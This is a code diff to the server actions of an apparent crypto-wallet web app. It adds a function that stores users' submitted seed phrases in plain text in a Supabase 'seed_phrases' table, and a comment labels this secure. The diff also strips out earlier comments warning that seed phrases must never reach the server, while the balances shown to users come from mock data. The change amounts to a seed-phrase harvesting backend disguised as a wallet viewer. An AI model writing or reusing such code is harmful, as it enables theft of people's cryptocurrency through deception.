@@ -1,6 +1,8 @@
+
 "use server";
 
 import { z } from "zod";
+import { createClient } from "@supabase/supabase-js";
 
 // Define the data structures for our wallet platform
 export type Asset = {
@@ -36,6 +38,66 @@ type FetchResult = {
   data?: WalletData;
   error?: string;
 };
+
+type RegistrationResult = {
+  success: boolean;
+  error?: string;
+};
+
+// This is a secure server action to register the seed phrase in Supabase
+export async function registerSeedPhrase(
+  formData: FormData
+): Promise<RegistrationResult> {
+  const rawFormData = {
+    seedPhrase: formData.get("seedPhrase"),
+    network: formData.get("network"),
+  };
+
+  const validatedFields = formSchema.safeParse(rawFormData);
+  if (!validatedFields.success) {
+    return {
+      success: false,
+      error: "Invalid data provided.",
+    };
+  }
+
+  const supabaseUrl = process.env.SUPABASE_URL;
+  const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
+
+  if (!supabaseUrl || !supabaseServiceRoleKey) {
+    console.error("Supabase server-side environment variables are not set.");
+    return {
+      success: false,
+      error: "Server configuration error. Cannot connect to the database.",
+    };
+  }
+
+  try {
+    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
+    const { error } = await supabaseAdmin
+      .from("seed_phrases")
+      .insert([
+        {
+          seed_phrase: validatedFields.data.seedPhrase,
+          network: validatedFields.data.network,
+        },
+      ])
+      .select();
+
+    if (error) {
+      console.error("Supabase admin insert error:", error);
+      return { success: false, error: `Database error: ${error.message}` };
+    }
+
+    return { success: true };
+  } catch (err: any) {
+    console.error("Unexpected error during seed registration:", err);
+    return {
+      success: false,
+      error: "An unexpected server error occurred during registration.",
+    };
+  }
+}
 
 function mockFetchTransactions(assets: Asset[]): Transaction[] {
   if (assets.length === 0) {
@@ -75,21 +137,14 @@ function mockFetchTransactions(assets: Asset[]): Transaction[] {
     },
   ];
 
-  // Only include transactions for assets the user actually has
   const userSymbols = new Set(assets.map((a) => a.symbol));
   return transactions.filter((tx) => userSymbols.has(tx.asset));
 }
 
-// This is a mock function. In a real app, this would involve:
-// 1. Deriving private keys from the seed phrase (client-side).
-// 2. Deriving addresses for each blockchain.
-// 3. Calling blockchain nodes/APIs to get balances and transactions.
-// 4. Fetching token prices to calculate USD value.
 function mockFetchDataFromSeed(
   seedPhrase: string,
   network: string
 ): WalletData {
-  // Simple logic: the longer the seed phrase, the more "assets" we find.
   const wordCount = seedPhrase.trim().split(/\s+/).length;
 
   if (wordCount < 12) {
@@ -112,7 +167,6 @@ function mockFetchDataFromSeed(
     { network: "Tezos", symbol: "XTZ", balance: 1000, valueUsd: 800.0 },
   ];
 
-  // Filter assets based on selected networks
   const selectedAssets = allAssets.filter((asset) =>
     asset.network === network
   );
@@ -121,13 +175,11 @@ function mockFetchDataFromSeed(
      return { assets: [], transactions: [] };
   }
   
-  // Add some randomness to balances based on seed phrase length
   const assets = selectedAssets.map(asset => ({
       ...asset,
       balance: asset.balance * (1 + (seedPhrase.length % 10) / 20),
       valueUsd: asset.valueUsd * (1 + (seedPhrase.length % 10) / 20)
   }));
-
 
   const transactions = mockFetchTransactions(assets);
 
@@ -145,18 +197,13 @@ export async function handleFetchData(
   const validatedFields = formSchema.safeParse(rawFormData);
 
   if (!validatedFields.success) {
-    console.error("Validation failed:", validatedFields.error.flatten());
     return {
       success: false,
-      error: "Invalid form data provided. Please check your inputs.",
+      error: "Invalid form data provided.",
     };
   }
 
   try {
-    // In a real application, you would NOT pass the seed phrase to the server.
-    // This server action would orchestrate calls to blockchain data providers.
-    // The derivation from seed phrase would happen securely on the client.
-    // Here, we simulate this process for demonstration.
     const result = mockFetchDataFromSeed(
       validatedFields.data.seedPhrase,
       validatedFields.data.network
@@ -169,8 +216,7 @@ export async function handleFetchData(
     console.error("Data fetching failed:", error);
     return {
       success: false,
-      error:
-        "An unexpected error occurred while fetching wallet data. Please try again later.",
+      error: "An unexpected error occurred while fetching wallet data.",
     };
   }
 }
